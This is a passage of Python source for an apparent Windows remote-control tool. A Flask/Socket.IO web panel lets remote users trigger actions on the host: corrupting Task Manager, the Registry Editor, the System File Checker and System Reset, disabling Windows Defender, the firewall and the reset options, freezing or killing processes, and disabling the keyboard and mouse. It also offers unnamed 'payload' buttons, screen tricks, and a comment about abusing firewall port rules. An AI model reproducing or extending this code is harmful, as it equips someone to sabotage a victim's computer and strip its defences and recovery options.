        data = response.json()

        # Extract weather details
        temperature = round(data['main']['temp'])
        humidity = data['main']['humidity']
        wind_speed = data['wind']['speed']
        precipitation = data['clouds']['all'] / 100
        weather_description = data['weather'][0]['description'].lower()

        # Determine the greeting
        now = datetime.now()
        hour = now.hour
        if 5 <= hour < 12:
            greeting = "Good morning"
        elif 12 <= hour < 18:
            greeting = "Good afternoon"
        else:
            greeting = "Good evening"

        # Describe the weather condition
        weather_phrase = get_weather_description(weather_description)
        condition = "Enjoy your day!"

        if weather_phrase in ["showers", "rain"]:
            condition = f"Grab your umbrella! It's going to be {weather_phrase}."
        elif weather_phrase == "thunderstorms":
            condition = "Stay safe indoors, as there are expected thunderstorms."
        elif weather_phrase == "snow":
            condition = "Get ready for a winter wonderland! It's snowing."
        elif weather_phrase == "mist":
            condition = "Expect misty conditions, be cautious while driving."
        elif weather_phrase == "dust":
            condition = "Dusty conditions prevail. Drive carefully and protect your eyes."

        # Additional weather-specific details
        wind_description = f"Expect a {wind_speed} m/s breeze." if wind_speed > 1 else ""
        precipitation_description = f"Anticipate {round(precipitation * 100)}% chance of precipitation." if precipitation > 0 else ""
        heat_description = "It's going to be hot and humid. Stay hydrated." if temperature > 30 and humidity > 70 else ""

        # Combine everything into a more dynamic and informative greeting
        welcome = f"{greeting},<br>The current weather is {weather_phrase}. {condition}<br>Temperature: {temperature}°C | Humidity: {humidity}%<br>{wind_description} {precipitation_description} {heat_description}"

        return welcome

    @app.route('/', methods=['GET'])
    def index():
        location = geocoder.ip('me').latlng
        try:
            street_address = get_street_address(location[0], location[1])
        except:
            street_address = "Unknown, Failed fetching info"
        console = "" # Initialize console as an empty string
        

        function_descriptions = {
        'installchrome': 'Install Chrome',
        'corrupttaskmgr': 'Corrupt Task Manager',
        'corruptmmc': 'Corrupt Management Console',
        'corruptregedit': 'Corrupt Registry Editor',
        'corruptdllhost': 'Corrupt DLL Host',
        'corruptsfc': 'Corrupt System File Checker',
        'corruptsystemreset': 'Corrupt System Reset',
        'screenoff': 'Screen Off',
        'disableUserAccountControl': 'Disable User Account Control',
        'enableUserAccountControl': 'Enable User Account Control',
        'swapRMBAndLMB': 'Swap Right Mouse Button And Left Mouse Button',
        'DisableWindowsDefender': 'Disable Windows Defender',
        'EnableWindowsDefender': 'Enable Windows Defender',
        'disableresetoptions': 'Disable Reset Options',
        'enableresetoptions': 'Enable Reset Options',
        'restartToUAC': 'Restart Script To Obtain UAC',
        'terminate_unknown_processes': 'Terminate Unknown Processes',
        'restart_explorer': 'Restart Explorer',
        'reset_network': 'Reset Network',
        'disablefirewall': 'Disable Firewall',
        'enablefirewall': 'Enable Firewall',
        'restartToADvancedOptions': 'Restart To Advanced Options',
        'disableTaskmanager': 'Disable Task Manager',
        'enabletaskmgr': 'Enable Task Manager',
        'freeze_all_processes': 'Freeze All Processes',
        'unfreeze_all_processes': 'Unfreeze All Processes',
        'restart_self': 'Restart Self',
        'disableUWF': 'Disable Unified Write Filter',
        'enableUWF': 'Enable Unified Write Filter',
        'installdiversify': 'Deploy Diversify',
        }

        
        greeting_text = generate_weather_greeting(location)
        console = "" # Initialize console as an empty string
        local_ip = socket.gethostbyname(socket.gethostname())
        
        tool_list = [{'name': func, 'desc': desc} for func, desc in function_descriptions.items()]
        
        categories = [
            {
                'name': 'Stuff..',
                'buttons': [
                    {'name': 'Open website', 'placeholder': 'Enter the URL of the website you wish'},
                    {'name': 'Text to speech', 'placeholder': 'Text to speech, deep male voice, English only'},
                    {'name': 'Speak in a language', 'placeholder': 'Hear any language (except Hebrew) by writing in it'},
                    {'name': 'Play frequency', 'placeholder': 'Formatted as HZ:Duration-in-milliseconds'},
                    {'name': 'Play Shepard tone', 'placeholder': 'Formatted as \"StartHZ:EndHZ:Duration-in-seconds\"'},

                    {'name': 'Restart Explorer'},
                    {'name': 'Download And Install Chrome'}
                ]
            },
            {
                'name': 'Display Manipulation',
                'buttons': [
                    {'name': 'Send to background highlight', 'placeholder': 'Explanation: The app that the computer user will click on will be hidden.'},
                    {'name': 'Turn the Screen black', 'placeholder': 'For how long? Duration in seconds'},
                    {'name': 'Make the screen rotate', 'placeholder': 'For how long to do the rotations? (seconds)'},
                    {'name': 'Flip screen: upsidedown'},
                    {'name': 'Flip screen: right'},
                    {'name': 'Flip screen: normal'},
                    {'name': 'Flip screen: left'},
                    {'name': 'payload1'},
                    {'name': 'payload2'},
                    {'name': 'payload3'},
                    {'name': 'payload4'},
                    {'name': 'payload5'},
                    {'name': 'payload6'}
                ]
            },
            {
                'name': 'System Control',
                'buttons': [
                    {'name': 'Per click, lag windows (Enable)'},
                    {'name': 'Per click, lag windows (Disable)'},
                    {'name': 'Swap RMB and LMB'},
                    {'name': 'Unswap RMB and LMB'},
                    {'name': 'enablekeyboard'},
                    {'name': 'disablekeyboard'},
                    {'name': 'enablemouse'},
                    {'name': 'disablemouse'}
                ]
            },
            {
                'name': 'Miscellaneous/Fun',
                'buttons': [
                    {'name': 'Me and the boys!'},
                    {'name': 'presskeys', 'placeholder': 'Press keys in Windows, combinations go as "key+key+key"'},
                    {'name': 'writetext', 'placeholder': 'Type text'},
                    {'name': 'Type a String like a human', 'placeholder': 'Type at the speed of a human'}

                ]
            }
        ]

        print(f'ADDRESS REMOTE: {request.remote_addr}')
        
        
        global prioritizeipv4
        print(f'prioritizeipv4: {prioritizeipv4}')
        if prioritizeipv4 != None:
            print(repr(prioritizeipv4))
            try:
                ip_of_client = request.remote_addr
                if ip_of_client in prioritizeipv4:
                    pass
                else:
                    return False # since it returns there is no need in limiting the handleconnection thing in the else here, as if it does in fact error out, it won't accept nothing which isn't ideal
            except Exception as e:
                print(f'Error in prioritizeipv4 handling of WEBUI: {e}')

        return render_template('index.html', welcome=greeting_text, categories=categories)

    @app.route('/submit', methods=['POST'])
    def submit():
        button = request.form.get('button')
        client_id = button.split('_')[1] # Extract the client's ID
        print(f'Client ID: {client_id}')
        print(f'Button pressed: {button}')
        try:
            threading.Thread(target=handle_button_click, args=(button, client_id)).start()
        except Exception as e:
            print(f'Error in creating a thread for handle button click: {e}')
        return ''

    
    clients = {}

    @socketio.on('connect')
    def handle_connect():
        ip_address = request.remote_addr
        clients[ip_address] = request.sid

    
    def handle_button_click(button_name, client_id):
        print("Button clicked by client:", client_id)
        print("Button clicked:", button_name)
        text = None
        if button_name.endswith('_buttonnotextfield'): print(f'Clicked button with no textfield: {button_name}')
        else:
            try: 
                print('trying to obtain response')
                text = requestValue(button_name.replace('_button', '_textfield'), client_id)
            except Exception as e:
                print(f'Error in requestValue: {e}') 
                text = ""
            if text == "" or text == None:
                text = None
        # act accordingly, you have the information thing and the button/name thing itslef
        #also m,ake the showalert thing show the alert if missing the information such as the time and etc
        # print(f'Text: {text}')
        # if the function requires text in. user did not provide it. Show alert. user didn't provide any text
        global prioritizeipv4
        print(f'prioritizeipv4: {prioritizeipv4}')
        if prioritizeipv4 != None:
            print(repr(prioritizeipv4))
            try:
                ip_of_client = client_id
                if ip_of_client in prioritizeipv4:
                    pass
                else:
                    socketio.emit('show_alert', {'message': 'Authorization revoked', 'client_id': client_id}, room=clients[client_id])
                    print(f'Blocking user: {ip_of_client}')
                    return # since it returns there is no need in limiting the handleconnection thing in the else here, as if it does in fact error out, it won't accept nothing which isn't ideal
            except Exception as e:
                print(f'Error in prioritizeipv4 handling of receive todo phones: {e}')
        button_name = button_name.split('_')[0]
        print(f'Button clicked: {button_name}')
        if function_needs_text(button_name):
            print('Function needs text')
            if text == None or text == '' or text == 'None':
                print('User did not provide any text')
                # socketio.send(f'User did not provide any text when running {button_name}', room=clients[client_id])
                socketio.emit('show_alert', {'message': 'Remember to provide text when executing some of the functions', 'client_id': client_id}, room=clients[client_id])
                # webhandler('User did not provide any text')
                return
        runtsk = threading.Thread(target=run_task, args=(button_name, text)) #run_task(button_name, text)
        runtsk.start()
        # webhandler(text)
        # type_string_with_human_delay(text)
        # speakXlanguage(text)
        # texttospeech(text)
        # blackenscreen(text)
        # play_tone(text.split(':')[0], text.split(':')[1]) # format as frequency:duration
        # play_shepard_tone(text.split(':')[0], text.split(':')[1], text.split(':')[2]) # format as frequencystart:end:duration
        # inviscurr(text)
        # rotatescreen(text)
        # flipscreen()
        # screenportraitflipped() # right
        # screenportrait() # left
        # screenlandscape()
        # enable_windows_lag_click_sound()
        # disable_windows_lag_click_sound()
        # swapRMBAndLMB(False)    
        # swapRMBAndLMB(True)         
        # MeAndTheBoys()
        # installchrome()
        # restart_explorer()
        # payload_1()
        # payload_2()
        # payload_3()
        # payload_4()
        # payload_5()
        # payload_6()
        
        # enable_keyboard()
        # disable_keyboard()
        # enable_mouse()
        # disable_mouse()
        
        # presskeys(text)
        # writetext(text)



    def function_needs_text(function_name):
        text_required_functions = [
        'open website', 'text to speech', 'speak in a language', 'play frequency', 'play shepard tone',
        'send to background highlight', 'make the screen rotate', 'press keys', 'type a string like a human'
        ]
        return function_name.lower() in text_required_functions

    def run_task(task, text=None):
        task = task.lower()  # Convert task to lowercase for case insensitivity
        
        if task == 'open website':
            print("Opening website:", text)
            webhandler(text)
        elif task == 'text to speech':
            print("Converting text to speech:", text)
            texttospeech(text)
        elif task == 'speak in a language':
            print("Speaking in specified language:", text)
            speakXlanguage(text)
        elif task == 'play frequency':
            frequency, duration = text.split(':')
            print("Playing frequency:", frequency, "Duration:", duration)
            play_tone(int(frequency), int(duration))
        elif task == 'play shepard tone':
            start_freq, end_freq, duration = text.split(':')
            print("Playing Shepard tone from", start_freq, "to", end_freq, "Duration:", duration)
            play_shepard_tone(int(start_freq), int(end_freq), int(duration))
        elif task == 'restart explorer':
            print("Restarting Explorer")
            restart_explorer()
        elif task == 'download and install chrome':
            print("Downloading and installing Chrome")
            installchrome()
        elif task == 'send to background highlight':
            print("Sending to background and highlighting:", text)
            inviscurr(text)
        elif task == 'turn the screen black':
            print("Turning the screen black for", text, "seconds")
            blackenscreen(text)
        elif task == 'make the screen rotate':
            print("Rotating the screen for", text, "seconds")
            makethescreendorotations(text)
        elif task == 'flip screen: upsidedown':
            print("Flipping the screen upside down")
            flipscreen()
        elif task == 'flip screen: right':
            print("Flipping the screen to the right")
            screenportraitflipped()
        elif task == 'flip screen: normal':
            print("Flipping the screen to the normal position")
            screenlandscape()
        elif task == 'flip screen: left':
            print("Flipping the screen to the left")
            screenportrait()
        elif task == 'payload1':
            print("Executing payload 1")
            payload_1()
        elif task == 'payload2':
            print("Executing payload 2") 
            payload_2()
        elif task == 'payload3':
            print("Executing payload 3")
            payload_3()
        elif task == 'payload4':
            print("Executing payload 4")
            payload_4()
        elif task == 'payload5':
            print("Executing payload 5")
            payload_5()
        elif task == 'payload6':
            print("Executing payload 6")
            payload_6()
        elif task == 'per click, lag windows (enable)':
            print("Enabling per click lag for windows")
            enable_windows_lag_click_sound()
        elif task == 'per click, lag windows (disable)':
            print("Disabling per click lag for windows")
            disable_windows_lag_click_sound()
        elif task == 'swap rmb and lmb':
            print("Swapping right and left mouse buttons")
            swapRMBAndLMB(True)
        elif task == 'unswap rmb and lmb':
            print("Unswapping right and left mouse buttons")
            swapRMBAndLMB(False)
        elif task == 'enablekeyboard':
            print("Enabling keyboard")
            enable_keyboard()
        elif task == 'disablekeyboard':
            print("Disabling keyboard")
            disable_keyboard()
        elif task == 'enablemouse':
            print("Enabling mouse")
            enable_mouse()
        elif task == 'disablemouse':
            print("Disabling mouse")
            disable_mouse()
        elif task == 'me and the boys!':
            print("It's me and the boys time!")
            MeAndTheBoys()
        elif task == 'presskeys':
            print("Pressing keys:", text)
            presskeys(text)
        elif task == 'writetext':
            print("Typing text:", text)
            type_string_with_human_delay(text)
        elif task == 'type a string like a human':
            print("Typing a string like a human:", text)
            type_string_with_human_delay(text)
        else:
            print("Task not found")




    def requestValue(element_id, client_id):
        socketio.emit('get_value', {'element_id': element_id, 'client_id': client_id})
        global last_response_from_clientUI, newresponse
        newresponse = ''
        # last_response_from_clientUI = ''
        timeout = time.time() + 4
        while newresponse == '':
            # slp(1)
            # print(f'new response: {newresponse}')
            if time.time() > timeout:
                print('Timeout reached. No response received for: ' + element_id)
                return ''
            
        # tr = newresponse
        # newresponse = ''
        # newresponse = 'totallyrandomstrionsakjbasfkjhlbsfila54yi3eikrlgewiuyk'
        # print('tsasd')
        return newresponse

        
    @socketio.on('value_response')
    def handle_value_response(data):
        element_id = data['element_id']
        value = data['value']
        print(f'Received value : {value} for {element_id}') # Add this line
        global newresponse
        newresponse = value
        return ''


    functionstocheckname = [
        'onStartupest'
    ]


            
            
    socketio.run(app, host=socket.gethostbyname(socket.gethostname()), port=10001)

def mainuirun():
    while True:
        try:
            websiteUI()
        except Exception as e:
            print(f'Error in socwebsiteUI: {e} \nRetrying in 3 seconds')
            slp(3)

mainui = threading.Thread(target=mainuirun)
mainui.start()
print('server started on: http://' + socket.gethostbyname(socket.gethostname()) + ':10001')


# import signal
# import sys

# def handler(signum, frame):
#     print('Terminate signal received. Running cleanup commands...')
#     # Run your cleanup commands here
#     print('Cleanup done. Exiting...')
#     sys.exit(0)

# # Register the signal handler
# signal.signal(signal.SIGTERM, handler)



# def dvdthingtmp(): # delete after, this is just so i can easily access this code
#     pygame.init()

#     # Screen dimensions (adjust as needed)
#     screen_width = win32api.GetSystemMetrics(0)
#     screen_height = win32api.GetSystemMetrics(1)

#     # Capture a screenshot
#     screenshot = pyautogui.screenshot()

#     # Convert screenshot to bytes for Pygame
#     img_bytes = io.BytesIO()  # Create a BytesIO object
#     screenshot.save(img_bytes, format='PNG')  # Save the screenshot as PNG data
#     img_bytes.seek(0)  # Rewind the BytesIO object

#     # Create Pygame image from the bytes
#     original_image = pygame.image.load(img_bytes)

#     # Set up fullscreen display without decorations
#     screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN | pygame.NOFRAME)
#     pygame.mouse.set_visible(False)
#     # Set window always on top
#     hwnd = pygame.display.get_wm_info()["window"]
    
#     win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
#     # Scale the image to a smaller size (adjust scaling factor as desired)

#     scale = 0.2
#     speed = 0.6

#     dvd_width = int(original_image.get_width() * scale)
#     dvd_height = int(original_image.get_height() * scale)
#     dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))

#     # Initial DVD position and movement direction
#     dvd_x = random.randint(0, screen_width - dvd_width)
#     dvd_y = random.randint(0, screen_height - dvd_height)
#     dx = speed
#     dy = speed

#     # Animation loop
#     running = True
#     while running:
#         for event in pygame.event.get():
#             if event.type == pygame.QUIT:
#                 running = False

#         # Update DVD position
#         dvd_x += dx
#         dvd_y += dy

#         # Check for collisions with edges/corners
#         if dvd_x < 0 or dvd_x + dvd_width > screen_width:
#             dx *= -1  # Reverse direction on horizontal collision
#             dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))  # Reset to original image
#             dvd_image.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 255), special_flags=pygame.BLEND_RGBA_MULT)  # Change color
#             dvd_image = pygame.transform.flip(dvd_image, True, False)
#             print("Hit horizontal edge!")  # Optional: Print a message

#         if dvd_y < 0 or dvd_y + dvd_height > screen_height:
#             dy *= -1  # Reverse direction on vertical collision
#             dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))  # Reset to original image
#             dvd_image.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 255), special_flags=pygame.BLEND_RGBA_MULT)  # Change color
#             dvd_image = pygame.transform.flip(dvd_image, False, True)
#             print("Hit vertical edge!")  # Optional: Print a message

#         # Fill background with black
#         screen.fill((0, 0, 0))

#         # Draw the DVD image
#         screen.blit(dvd_image, (dvd_x, dvd_y))

#         # Update the display
#         pygame.display.flip()

#     pygame.quit()


killablethread_thread = None


def startdvdanim():
    global timeoutfordvd
    print('Starting DVD animation handler...')
    # Initialize Pygame
    def killablethreadtouse_dvd():
        pygame.quit()
        pygame.init()

        # Screen dimensions (adjust as needed)
        screen_width = win32api.GetSystemMetrics(0)
        screen_height = win32api.GetSystemMetrics(1)

        # Capture a screenshot
        screenshot = pyautogui.screenshot()

        # Convert screenshot to bytes for Pygame
        img_bytes = io.BytesIO()  # Create a BytesIO object
        screenshot.save(img_bytes, format='PNG')  # Save the screenshot as PNG data
        img_bytes.seek(0)  # Rewind the BytesIO object

        # Create Pygame image from the bytes
        original_image = pygame.image.load(img_bytes)

        # Set up fullscreen display without decorations
        screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN | pygame.NOFRAME)
        pygame.mouse.set_visible(False)
        # Set window always on top
        hwnd = pygame.display.get_wm_info()["window"]
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        # Scale the image to a smaller size (adjust scaling factor as desired)

        scale = 0.2
        speed = 1.2

        dvd_width = int(original_image.get_width() * scale)
        dvd_height = int(original_image.get_height() * scale)
        dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))

        # Initial DVD position and movement direction
        dvd_x = random.randint(0, screen_width - dvd_width)
        dvd_y = random.randint(0, screen_height - dvd_height)
        dx = speed
        dy = speed

        # Animation loop
        running = True
        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False

            # Update DVD position
            dvd_x += dx
            dvd_y += dy

            # Check for collisions with edges/corners
            if dvd_x < 0 or dvd_x + dvd_width > screen_width:
                dx *= -1  # Reverse direction on horizontal collision
                dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))  # Reset to original image
                dvd_image.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 255), special_flags=pygame.BLEND_RGBA_MULT)  # Change color
                dvd_image = pygame.transform.flip(dvd_image, True, False)
                print("Hit horizontal edge!")  # Optional: Print a message

            if dvd_y < 0 or dvd_y + dvd_height > screen_height:
                dy *= -1  # Reverse direction on vertical collision
                dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))  # Reset to original image
                dvd_image.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 255), special_flags=pygame.BLEND_RGBA_MULT)  # Change color
                dvd_image = pygame.transform.flip(dvd_image, False, True)
                print("Hit vertical edge!")  # Optional: Print a message

            # Fill background with black
            screen.fill((0, 0, 0))

            # Draw the DVD image
            screen.blit(dvd_image, (dvd_x, dvd_y))

            # Update the display
            pygame.display.flip()

        pygame.quit()
    global killablethread_thread
    killablethread_thread = KThread(target=killablethreadtouse_dvd)
    while True:
        try:
            slp(1)
            

            if (keyboard_idle > timeoutfordvd and mouse_idle > timeoutfordvd):
                print('is idle!')
                if not killablethread_thread.is_alive():
                    killablethread_thread.start()
                    print("Started DVD thread")
                slp(1)
            else:
                print('no not idle')
                if killablethread_thread.is_alive():

                    killablethread_thread.kill()
                    killablethread_thread.join()
                    print("Killed DVD thread")
                    killablethread_thread = KThread(target=killablethreadtouse_dvd)
                    
        except Exception as e:
            print(e)    
    

last_keyboard_input_time = time.time()

def update_last_keyboard_input_time():
    global last_keyboard_input_time
    # print('Starting keyboard thread for updating last keyboard input time')
    check_if_keyboard_pressed()
    last_keyboard_input_time = time.time()
    time.sleep(1)

def timer_how_long_since_last_keyboard_input():
    global keyboard_idle
    global last_keyboard_input_time
    # last_keyboard_input_time = time.time() # misplaced!

    threading.Timer(0, update_last_keyboard_input_time).start()


    keyboard_idle = time.time() - last_keyboard_input_time

def start_timer_keyboardcheck():
    threading.Timer(1.0, start_timer_keyboardcheck).start()
    timer_how_long_since_last_keyboard_input()

threading.Timer(1.0, start_timer_keyboardcheck).start()





# now for the mouse which is wayy easier



last_mouse_input_time = time.time()

def update_last_mouse_input_time():
    global last_mouse_input_time
    # print('Starting mouse thread for updating last mouse input time')
    check_if_mouse_moved()  # Assuming this function exists and works correctly
    last_mouse_input_time = time.time()
    time.sleep(1)

def timer_how_long_since_last_mouse_input():
    global mouse_idle
    global last_mouse_input_time

    threading.Timer(0, update_last_mouse_input_time).start()

    mouse_idle = time.time() - last_mouse_input_time

def start_timer_mousecheck():
    threading.Timer(1.0, start_timer_mousecheck).start()
    timer_how_long_since_last_mouse_input()

threading.Timer(1.0, start_timer_mousecheck).start()




dvd_runthread = KThread(target=startdvdanim)



def dvdtimeout(howlongofatimetocheck):
    global killablethread_thread
    """
    to interact with the dvd thing you use THIS
    """
    print("setting timeout to: " + str(howlongofatimetocheck))
    global timeoutfordvd, dvd_runthread
    timeoutfordvd = howlongofatimetocheck
    if dvd_runthread.is_alive() and howlongofatimetocheck == 0:
        print('should kill the thread thing')
        killablethread_thread.kill()
        dvd_runthread.kill()
        dvd_runthread = KThread(target=startdvdanim)
        return
    print(dvd_runthread.is_alive())
    if dvd_runthread.is_alive():
        pass
    else:
        print("starting thread")
        dvd_runthread.start()



# disablefirewall() # remove this, allow firewall, permanently and abuse this with port un/blocks. instead of this, just code a allow port for dvrfy
onStartup_thread = KThread(target=onStartup)
onStartup_thread.start()

def handleChangeIPv4():
    global server, INTERNET, ADDR, SERVER
    
    while True:
        if INTERNET == False:
            pass
        slp(5)
        if server.getsockname()[0] != socket.gethostbyname(socket.gethostname()):
            print('Detected a change to the ipv4, auto switching to the new ipv4 address')
            print(f'Changing IPv4 address to: {socket.gethostbyname(socket.gethostname())}')
            server.close()
            server = None
            time.sleep(4)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((socket.gethostbyname(socket.gethostname()), vary_PORT))
            # server.listen()
            SERVER = socket.gethostbyname(socket.gethostname())
            ADDR = (SERVER, vary_PORT)
            print(f"[LISTENING] Server is listening on {SERVER}:{vary_PORT}")
        else:
            slp(5)

handleipv4change_thread = KThread(target=handleChangeIPv4)
handleipv4change_thread.start()

def SendMessageToVaryHosts():
    """
    This is not for commands, onStartup is for that
    """
    while True:
        what = str(input("What to send?: ")) # cannot have any input if building windowed
        sendAllVaryHosts(what)
        print(f'Sent: {what} to {" ".join(str(i) for i in varyhosts)}')
 
 